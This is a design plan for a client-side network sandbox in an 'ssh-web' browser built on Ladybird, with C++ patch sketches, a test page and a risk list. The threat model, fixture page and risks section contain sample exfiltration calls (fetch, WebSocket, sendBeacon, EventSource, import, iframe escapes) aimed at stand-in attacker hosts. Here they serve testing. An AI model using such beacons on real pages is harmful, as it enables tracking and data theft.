# Plan 6: JS-Driven Network Sandbox for ssh-web Origins

> **Scope: NETWORK APIs ONLY.** Geolocation, mediaDevices, Bluetooth, USB, Notifications are deferred to a later plan.
> For agentic workers: use `superpowers:executing-plans` or `superpowers:subagent-driven-development` to implement step-by-step. Verify each task before proceeding to the next.

---

## Goal

Close the JS-driven network exfiltration channel: a page loaded from an `ssh-web://` origin must not be able to issue any network request that escapes the SSH tunnel. Every outbound network API — `fetch()`, `XMLHttpRequest`, `WebSocket`, `EventSource`, `sendBeacon`, `<img>`, `<script src>`, `<link href>`, `new Image()` — must be intercepted at a single chokepoint inside the fetch infrastructure. Requests whose URL is also `ssh-web://` are already handled (Plan 5). Requests whose URL is `http(s)://` and whose host is on the server's `proxy-cache.allow` list are proxied through the SSH tunnel (this path exists today in `ResourceLoader::handle_sshweb_load_request` and is preserved). All other outbound `http(s)://` requests from ssh-web origins are **blocked with a `NetworkError`**.

This plan does not touch geolocation, mediaDevices, WebRTC, Bluetooth, USB, or Notifications — those are deferred.

---

## Threat Model

A malicious or compromised page delivered over `ssh-web://example.com` wants to phone home to `https://attacker.com/beacon?id=<fingerprint>`. The browser's user-agent string, IP address, timing fingerprints, and installed fonts all constitute identity signal. The attacker controls the page JS and can use any web API that reaches a network socket.

The server-side `proxy-cache.allow` list is the policy boundary: only origins the server explicitly permits are reachable. The browser enforces this on the client side by blocking at the fetch dispatch point before any socket is opened, so the attacker cannot bypass it even if the IPC to SSHWebServer is somehow confused.

Threat variant 2: the attacker embeds a sandboxed `<iframe srcdoc="...">` or a `blob:` URL iframe. The embedded document gets an opaque origin, not an ssh-web origin. The origin-check logic must handle this (see Risks).

---

## Current State (2026-05-06)

### What exists and works

| File | State |
|---|---|
| `Libraries/LibWeb/Fetch/Infrastructure/URL.h` line 41-46 | `"ssh-web"sv` added to `FETCH_SCHEMES` under `#ifdef LADYBIRD_ENABLE_SSHWEB`. |
| `Libraries/LibWeb/Fetch/Fetching/Fetching.cpp` lines 1187-1191 | `scheme_fetch` has an ssh-web branch: routes to `nonstandard_resource_loader_file_or_http_network_fetch`. This handles `fetch("ssh-web://...")` from any origin — fine. |
| `Libraries/LibWeb/Loader/ResourceLoader.cpp` lines 418-452 | `load_resource` has an ssh-web dispatch block. Checks (a) request URL is ssh-web, or (b) active document URL scheme is ssh-web AND request URL is http(s). Routes both to synchronous `handle_sshweb_load_request`. **This is the current enforcement chokepoint.** |
| `Libraries/LibWeb/Loader/ResourceLoader.cpp` lines 571-692 | `handle_sshweb_load_request` — synchronous in-process libssh2 call. Plan 5b replaces this with async IPC. |

### What is missing for Plan 6

1. **No blocking** — the current dispatch block in `ResourceLoader::load_resource` routes ssh-web-initiated http(s) requests through SSH (good), but it does **not** block non-allowlisted ones. It sends them all through without consulting any allowlist. There is no allowlist check in the browser process at all.

2. **The fetch infrastructure chokepoint (`scheme_fetch`) is not the right place for the block** — `scheme_fetch` only fires when the *request URL* scheme is `ssh-web://`. It does not intercept an `ssh-web`-origin page calling `fetch("https://attacker.com")`. Those go through `main_fetch` → `http_fetch` → `nonstandard_resource_loader_file_or_http_network_fetch` → `ResourceLoader::load_resource`, bypassing the `scheme_fetch` branch entirely.

3. **`ResourceLoader::load_resource` is the true chokepoint**, and it already has an ssh-web-awareness block at lines 418-452. This is where the allowlist enforcement must be added.

4. **Allowlist data is not in the browser process.** The `CapabilitiesManifest` struct (`Libraries/LibSSHWeb/Manifest.h`) does not have a `proxy_cache_allow` field — the allowlist currently lives only in sshttpd's server config, enforced server-side. For Plan 6, the browser needs a local copy so it can block before opening a socket. Two options: (a) parse the `proxy-cache.allow` list from the capabilities manifest fetched at connect time, or (b) send the block to SSHWebServer and let it return a `403`-style error. Option (b) is simpler and more secure (server is authoritative); the browser just needs to distinguish "blocked by policy" from "network error".

5. **WebSocket** goes through `RequestClient::websocket_connect` in `WebSocket.cpp` line 224, bypassing `ResourceLoader::load_resource` entirely. It needs its own guard.

6. **EventSource** uses `Fetch::Fetching::fetch()` (goes through `main_fetch` → `ResourceLoader::load_resource`) — covered by the ResourceLoader chokepoint IF that chokepoint is properly wired.

7. **NavigatorBeacon** (`HTML/NavigatorBeacon.cpp` line 91) calls `Fetch::Fetching::fetch()` — covered by ResourceLoader chokepoint.

8. **ImageRequest** (`HTML/ImageRequest.cpp` line 122) calls `SharedResourceRequest::fetch_resource` → `Fetch::Fetching::fetch()` — covered.

9. **`<script>`, `<link>`, `<iframe>`** all eventually hit `ResourceLoader::load_resource` via `nonstandard_resource_loader_file_or_http_network_fetch` — covered.

### Key accessor pattern (confirmed from Fetching.cpp)

By the time `main_fetch` runs (line 384), the request's origin is already resolved from "client" to the actual `URL::Origin` (lines 360-368: `request.set_origin(request.client()->origin())`). So in `ResourceLoader::load_resource` and `nonstandard_resource_loader_file_or_http_network_fetch`, `request->origin()` holds the page's origin as a `URL::Origin` with `.scheme()` accessible.

However, in `ResourceLoader::load_resource`, the request is a `LoadRequest` (not a `Fetch::Infrastructure::Request`), so origin is not directly on it. The existing code reads origin via `page->top_level_traversable()->active_document()->url().scheme()` — this works but only captures the top-level document origin, not the initiating frame's origin. See Risks section.

---

## Chokepoints

### Primary: `ResourceLoader::load_resource` (lines 418-452)

**File:** `/Users/ricardo.moura/projects/misc/sshttpd/sshweb-browser/Libraries/LibWeb/Loader/ResourceLoader.cpp`

This is where all subresource loads (fetch, XHR, images, scripts, links, EventSource, sendBeacon) funnel before a socket is opened. The ssh-web block is already here. Plan 6 adds an allowlist check inside that block.

**What to add at lines 438-451:**
```cpp
if (request_scheme_is_sshweb || (initiated_from_sshweb && url.scheme().is_one_of("http"sv, "https"sv))) {
    if (!request_scheme_is_sshweb) {
        // http(s) request from ssh-web origin — check allowlist via SSHWebServer
        // Plan 6: For now, block all non-ssh-web requests that are NOT routed through proxy.
        // The server enforces the allowlist; if it blocks the request, we get an error back.
        // A future enhancement sends the allowlist to the browser at connect time for pre-flight blocking.
    }
    // ... existing dispatch ...
}
```

After Plan 5b lands (async IPC), the `on_complete` callback will receive errors from SSHWebServer, including allowlist denials. The browser just needs to surface those as `NetworkError` to JS.

### Secondary: `WebSocket::establish_web_socket_connection` (line 194)

**File:** `/Users/ricardo.moura/projects/misc/sshttpd/sshweb-browser/Libraries/LibWeb/WebSockets/WebSocket.cpp`

WebSocket bypasses ResourceLoader. The `url_record` scheme at line 194 is `ws://` or `wss://`. An ssh-web origin page opening a WebSocket to `wss://attacker.com` goes through `ResourceLoader::the().request_client()->websocket_connect(...)` at line 224. This must be intercepted before that call.

---

## Implementation Tasks

### Task 1 — Add `proxy_allow` to `CapabilitiesManifest` and parse it from server capabilities

**Files:**
- `/Users/ricardo.moura/projects/misc/sshttpd/sshweb-browser/Libraries/LibSSHWeb/Manifest.h`
- `/Users/ricardo.moura/projects/misc/sshttpd/sshweb-browser/Libraries/LibSSHWeb/Manifest.cpp`

**Changes:**

In `Manifest.h`, add to `CapabilitiesManifest`:
```cpp
struct ManifestProxyCache {
    Vector<String> allow; // hostnames, e.g. "fonts.googleapis.com"
};

struct CapabilitiesManifest {
    // ... existing fields ...
    Optional<ManifestProxyCache> proxy_cache;
};
```

In `Manifest.cpp`, parse the `proxy-cache.allow` array from the capabilities JSON. The server returns this in the `capabilities` command response (confirmed by `ClientMode.cpp:59`).

**Verification:** Parse the Google Fonts example from `examples/site/` fixtures; assert `manifest.proxy_cache->allow` contains `"fonts.googleapis.com"`.

---

### Task 2 — Store the parsed manifest per-origin in `SSHWebClient::Client`

**Files:**
- `/Users/ricardo.moura/projects/misc/sshttpd/sshweb-browser/Libraries/LibSSHWebClient/Client.h`
- `/Users/ricardo.moura/projects/misc/sshttpd/sshweb-browser/Libraries/LibSSHWebClient/Client.cpp`

**Changes:**

Add to `Client`:
```cpp
void set_manifest(SSHWeb::CapabilitiesManifest manifest) { m_manifest = move(manifest); }
Optional<SSHWeb::CapabilitiesManifest> const& manifest() const { return m_manifest; }
bool is_host_allowlisted(StringView host) const;

private:
    Optional<SSHWeb::CapabilitiesManifest> m_manifest;
```

`is_host_allowlisted` iterates `m_manifest->proxy_cache->allow` and returns true if `host` matches (exact match or subdomain, per the spec).

After connect (when capabilities are fetched at startup), parse the manifest and call `set_manifest`. This is already done in `ClientMode.cpp` — wire the same call into the IPC-connected client path in `ConnectionFromClient.cpp`.

**Verification:** After connecting to `ssh-web://localhost:32443/`, `client.is_host_allowlisted("fonts.googleapis.com")` returns true; `client.is_host_allowlisted("attacker.com")` returns false.

---

### Task 3 — Block non-allowlisted http(s) requests from ssh-web origins in `ResourceLoader::load_resource`

**File:** `/Users/ricardo.moura/projects/misc/sshttpd/sshweb-browser/Libraries/LibWeb/Loader/ResourceLoader.cpp`

**Changes:**

Replace the dispatch block (currently lines 438-451) with:

```cpp
if (request_scheme_is_sshweb || (initiated_from_sshweb && url.scheme().is_one_of("http"sv, "https"sv))) {
    // Enforce the proxy allowlist for outbound http(s) requests from ssh-web origins.
    if (!request_scheme_is_sshweb) {
        bool allowed = false;
        if (auto* client = WebView::Application::sshweb_server_client_ptr()) {
            allowed = client->is_host_allowlisted(url.serialized_host().value_or({}));
        }
        if (!allowed) {
            auto msg = ByteString::formatted(
                "ssh-web: request to '{}' blocked — host not in server's proxy-cache.allow list", url);
            log_failure(request, msg);
            on_complete->function()(false, {}, StringView(msg));
            return nullptr;
        }
    }
    // Existing async dispatch (after Plan 5b: dispatch_sshweb_load_request)
    dispatch_sshweb_load_request(request, on_complete, on_headers_received, on_data_received);
    return nullptr;
}
```

Note: `WebView::Application::sshweb_server_client_ptr()` is a nullable variant of the existing accessor that returns `nullptr` when the server isn't connected (graceful degradation: if SSHWebServer isn't up, block everything from ssh-web origins).

**Verification:**
- Write fixture page `examples/site/sandbox-block.html` — see Task 6.
- In headless browser, load `ssh-web://localhost:32443/sandbox-block.html`, confirm the fetch to `https://attacker.com` is blocked with `NetworkError` and the fetch to `https://fonts.googleapis.com/...` succeeds (proxied).

---

### Task 4 — Block WebSocket connections from ssh-web origins to non-allowlisted hosts

**File:** `/Users/ricardo.moura/projects/misc/sshttpd/sshweb-browser/Libraries/LibWeb/WebSockets/WebSocket.cpp`

WebSocket bypass path: `establish_web_socket_connection` at line 194 reads `origin_string` from `window_or_worker.origin()` (line 199). This is the *initiating page's* origin, which is exactly what we need.

**Changes:**

After line 199 (`auto origin_string = ...`), add:

```cpp
#ifdef LADYBIRD_ENABLE_SSHWEB
    // Block WebSocket connections from ssh-web origins to non-allowlisted hosts.
    if (client.origin().scheme() == "ssh-web"sv) {
        auto host = url_record.serialized_host().value_or({});
        bool is_allowlisted = false;
        if (auto* sshweb_client = WebView::Application::sshweb_server_client_ptr())
            is_allowlisted = sshweb_client->is_host_allowlisted(host);

        if (!is_allowlisted) {
            // Fire the "error" event and set readyState to CLOSED.
            dispatch_event(*DOM::Event::create(realm(), HTML::EventNames::error));
            m_ready_state = WebSocket::CLOSED;
            dispatch_event(*CloseEvent::create(realm(), HTML::EventNames::close, { .code = 1006, .reason = "Blocked by SSH-Web policy"_string, .was_clean = false }));
            return {};
        }
    }
#endif
```

**Verification:** Fixture page calls `new WebSocket("wss://attacker.com")` from ssh-web origin; confirm `onerror` fires and `readyState` is `CLOSED`.

---

### Task 5 — Verify EventSource, sendBeacon, and all image/script/link loaders are covered

These all funnel through `Fetch::Fetching::fetch()` → `main_fetch` → `nonstandard_resource_loader_file_or_http_network_fetch` → `ResourceLoader::load_resource`. After Task 3 is in place, they are automatically covered. This task is verification only.

**Steps:**
1. In `nonstandard_resource_loader_file_or_http_network_fetch` (Fetching.cpp line 2104), add a `dbgln` at entry confirming the request URL and the `LoadRequest` that gets built.
2. Add headless test assertions for each API type (see Task 6).

**Files:** No code changes required if ResourceLoader chokepoint is correct.

---

### Task 6 — Write fixture pages and headless tests

**New files under `/Users/ricardo.moura/projects/misc/sshttpd/sshweb-browser/examples/site/`:**

#### `examples/site/sandbox-block.html`
```html
<!DOCTYPE html>
<title>SSH-Web Network Sandbox Test</title>
<script>
// Test 1: fetch to attacker — must fail
fetch('https://attacker.example.com/beacon')
  .then(() => document.querySelector('#t1').textContent = 'FAIL: not blocked')
  .catch(e => document.querySelector('#t1').textContent = 'PASS: ' + e.message);

// Test 2: fetch to allowlisted host — must succeed (proxied)
// Requires fonts.googleapis.com in proxy-cache.allow
fetch('https://fonts.googleapis.com/css2?family=Inter')
  .then(r => document.querySelector('#t2').textContent = 'PASS: status ' + r.status)
  .catch(e => document.querySelector('#t2').textContent = 'FAIL: ' + e.message);

// Test 3: same-origin ssh-web fetch — must succeed
fetch('/api/ping')
  .then(r => document.querySelector('#t3').textContent = 'PASS: status ' + r.status)
  .catch(e => document.querySelector('#t3').textContent = 'FAIL: ' + e.message);

// Test 4: WebSocket to attacker — must fail
const ws = new WebSocket('wss://attacker.example.com/ws');
ws.onerror = () => document.querySelector('#t4').textContent = 'PASS: ws blocked';
ws.onopen = () => document.querySelector('#t4').textContent = 'FAIL: ws opened';

// Test 5: sendBeacon to attacker — must fail silently (return false)
const beaconResult = navigator.sendBeacon('https://attacker.example.com/track', 'data');
document.querySelector('#t5').textContent = beaconResult ? 'FAIL: beacon sent' : 'PASS: beacon blocked';

// Test 6: Image() to attacker — must fail
const img = new Image();
img.onerror = () => document.querySelector('#t6').textContent = 'PASS: img blocked';
img.onload = () => document.querySelector('#t6').textContent = 'FAIL: img loaded';
img.src = 'https://attacker.example.com/pixel.png';

// Test 7: EventSource to attacker — must fail
const es = new EventSource('https://attacker.example.com/events');
es.onerror = () => { document.querySelector('#t7').textContent = 'PASS: eventsource blocked'; es.close(); };
</script>
<body>
  <div id="t1">T1: pending</div>
  <div id="t2">T2: pending</div>
  <div id="t3">T3: pending</div>
  <div id="t4">T4: pending</div>
  <div id="t5">T5: pending</div>
  <div id="t6">T6: pending</div>
  <div id="t7">T7: pending</div>
</body>
```

#### `examples/site/sandbox-allow.html`
Shows a page that uses proxied external resources (fonts, CDN-hosted scripts) legitimately.

**Headless test command:**
```bash
./Build/release/bin/headless-browser --screenshot /tmp/sandbox.png \
    ssh-web://localhost:32443/sandbox-block.html
# Then: inspect DOM for PASS/FAIL markers via accessibility tree or stdout console.log output.
```

---

### Task 7 — Handle opaque-origin frames (srcdoc / sandboxed iframes)

An `<iframe srcdoc="...">` inside an ssh-web page gets an opaque origin (not ssh-web). The current `initiated_from_sshweb` check reads the *top-level document* URL, so it would correctly catch frames nested inside ssh-web pages. Verify this behavior.

**File:** `/Users/ricardo.moura/projects/misc/sshttpd/sshweb-browser/Libraries/LibWeb/Loader/ResourceLoader.cpp`

**Change (lines 428-435):** The current check reads `page->top_level_traversable()->active_document()`. This is correct for the simple case. For the nested-iframe case, also check whether the iframe's *parent document* has an ssh-web origin:

```cpp
auto initiated_from_sshweb = [&]() -> bool {
    if (auto page = request.page(); page) {
        // Top-level document is ssh-web
        auto traversable = page->top_level_traversable();
        if (auto doc = traversable->active_document(); doc && doc->url().scheme() == "ssh-web"sv)
            return true;
        // OR: the initiator is a nested document whose ancestor chain includes ssh-web
        // (covers srcdoc / sandboxed iframes embedded in ssh-web pages)
        // TODO: walk the navigable parent chain here — see HTMLIFrameElement::content_navigable()
    }
    return false;
}();
```

The full parent-chain walk is a risk item; see Risks.

**Verification:** Fixture page embeds `<iframe srcdoc="<script>fetch('https://attacker.com')</script>">` inside an ssh-web page; confirm the fetch is blocked.

---

## Test Fixtures Summary

| File | Purpose |
|---|---|
| `examples/site/sandbox-block.html` | Shows all APIs blocked when host not allowlisted |
| `examples/site/sandbox-allow.html` | Shows allowlisted proxied request succeeds |
| `examples/site/sandbox-iframe-srcdoc.html` | srcdoc iframe inside ssh-web page; verifies containment |
| `examples/site/sandbox-websocket.html` | Dedicated WS block/allow test |

---

## Task Ordering

```
Task 1 (Manifest.h parsing)
  → Task 2 (Client.h is_host_allowlisted)
    → Task 3 (ResourceLoader block)     ← main payoff
    → Task 4 (WebSocket block)          ← can parallel with Task 3
      → Task 5 (verify coverage)
        → Task 6 (fixture pages)
          → Task 7 (opaque-origin frames)
```

Tasks 3 and 4 are independent and can be done in parallel once Task 2 is done.

**Dependency on Plan 5b:** Task 3 references `dispatch_sshweb_load_request` (Plan 5b Task 5). If Plan 5b is not yet merged, keep the synchronous `handle_sshweb_load_request` call and add the allowlist block before it.

---

## Out of Scope / Deferred

- **geolocation, mediaDevices, Bluetooth, USB, Notifications** — deferred (behavior remains as upstream Ladybird; these do not issue network requests).
- **WebRTC** — deferred. RTCPeerConnection ICE candidates can leak IP. Should be blocked on ssh-web origins (`throw SecurityError`), but that is a separate plan.
- **Service Workers** — assumed effectively disabled on ssh-web origins because SW registration requires `https://` (or `localhost`) origin, and `ssh-web://` does not match. Verify with: `navigator.serviceWorker.register('/sw.js')` from ssh-web origin returns a rejected promise. No code change needed if Ladybird already enforces this; add a comment in the code.
- **Storage isolation** (cookies, localStorage partitioning) — deferred.
- **`window.sshweb` JS API surface** — the original Plan 6 scaffolded an IDL-defined `SSHWebInterface`. That work is deferred to a follow-on plan that adds the MCP and channel APIs. Plan 6 (this document) focuses only on the network sandbox.
- **Non-blocking libssh2 inside SSHWebServer** — deferred (Plan 5b note: blocks the SSHWebServer event loop per-request; acceptable for now).

---

## Risks

### R1: Opaque-origin frames escaping the sandbox (HIGH)

A page at `ssh-web://host/page.html` embeds:
```html
<iframe srcdoc="<script>fetch('https://attacker.com')</script>"></iframe>
```
The iframe document has an opaque origin. `initiated_from_sshweb` currently reads only the *top-level navigable's* active document URL. If the top-level document is ssh-web but the iframe is a nested navigable with a different active document, the check may still work because `page->top_level_traversable()` always returns the root. **Verify this assumption** by running the srcdoc fixture in Task 7. If it fails (the fetch is not blocked), add a parent-navigable walk.

### R2: blob: URL iframes (HIGH)

```js
const url = URL.createObjectURL(new Blob([`<script>fetch('https://attacker.com')</script>`], {type:'text/html'}));
document.body.appendChild(Object.assign(document.createElement('iframe'), {src: url}));
```
A blob URL fetched from within an ssh-web page gets an origin derived from the page's origin per the Fetch spec (the blob URL entry stores the environment's origin). In Ladybird, `scheme_fetch` for blob URLs calls `determine_the_environment` (line 976). The blob's origin should be the page's origin. Verify that `initiated_from_sshweb` catches requests from inside a blob-URL iframe created by an ssh-web page.

### R3: data: URL iframes (MEDIUM)

`<iframe src="data:text/html,<script>fetch('https://attacker.com')</script>">` — data: URLs get a unique opaque origin, not the enclosing page's origin. The top-level document is still ssh-web, so `initiated_from_sshweb` via `top_level_traversable()->active_document()` should still return true. Verify.

### R4: javascript: URL navigation (LOW in modern Ladybird)

`<a href="javascript:fetch('https://attacker.com')">` executes in the page's context; the resulting fetch has the page's origin. This is covered by the ResourceLoader block. No special handling needed.

### R5: dynamic import() (MEDIUM)

```js
import('https://attacker.com/evil.mjs')
```
Dynamic `import()` goes through the module loader, which may have a separate fetch path from `ResourceLoader::load_resource`. Check `Libraries/LibWeb/HTML/HTMLScriptElement.cpp` and `Libraries/LibJS/CyclicModule.cpp` for how module specifiers are resolved and whether they hit `ResourceLoader`. If not, a separate intercept is needed.

### R6: `<link rel=preload>` and `<link rel=modulepreload>` (MEDIUM)

These trigger eager fetches. They go through `HTMLLinkElement.cpp` → fetch infrastructure → ResourceLoader. Should be covered, but verify with a dedicated fixture.

### R7: CSS `url()` / `@import` (MEDIUM)

CSS `background: url('https://attacker.com/pixel.png')` and `@import url('https://attacker.com/evil.css')` are fetched by the CSS loader. These should hit `ResourceLoader::load_resource` for the resource fetch, so coverage is likely. Verify with a fixture.

### R8: Timing oracle via blocked request latency (LOW)

Even a NetworkError response leaks timing: how fast the block is returned tells the page whether the allowlist check happened client-side (instant) or server-side (milliseconds). This is acceptable for Plan 6 since the blocked response carries no content data. Document it.

### R9: Allowlist list not yet fetched at first page load (MEDIUM)

If the capabilities manifest fetch (which populates the allowlist) is async and the page issues a fetch before the manifest arrives, `is_host_allowlisted` returns false for everything including allowlisted hosts. This means legitimate proxied resources may fail during the initial connection window. Mitigation: queue or hold outbound http(s) requests until the manifest is ready (similar to how `RequestServer` connections queue requests until the process is up). If too complex for Plan 6, document as a known issue.

---

## Definition of Done

- [ ] `CapabilitiesManifest` parses `proxy-cache.allow` list.
- [ ] `SSHWebClient::Client::is_host_allowlisted()` works correctly.
- [ ] `ResourceLoader::load_resource`: `fetch("https://attacker.com")` from ssh-web origin → `NetworkError`; `fetch("https://fonts.googleapis.com/...")` from ssh-web origin → proxied response.
- [ ] `WebSocket`: `new WebSocket("wss://attacker.com")` from ssh-web origin → `error` + `close` events, readyState CLOSED.
- [ ] `EventSource`, `sendBeacon`, `Image()`, `<script src>`, `<img src>`, `<link href>` to non-allowlisted hosts from ssh-web origin → blocked.
- [ ] srcdoc iframe and blob-URL iframe inside ssh-web page cannot escape sandbox.
- [ ] `examples/site/sandbox-block.html` shows all PASS markers in headless browser.
- [ ] `examples/site/sandbox-allow.html` shows proxied resources loading.
- [ ] Service Worker check documented (assert it's already blocked by origin scheme mismatch).

After Plan 6, **Plan 7** (Browser UI) can build the address-bar, TOFU dialog, and Identities surface.
